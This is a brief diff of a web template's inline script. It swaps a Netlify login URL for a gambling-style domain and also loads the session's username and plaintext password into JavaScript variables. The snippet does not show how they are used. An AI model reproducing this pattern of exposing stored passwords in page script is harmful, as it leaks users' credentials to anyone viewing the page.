@@ -113,7 +113,7 @@
 <script>
   var errorMessage = @json(session('error'));
   var successMessage = @json(session('success'));
-  var url = 'https://livesportslotmm.netlify.app/login';
+  var url = 'https://club388slotmm.com';
   var name = @json(session('username'));
   var pw = @json(session('password'));
 
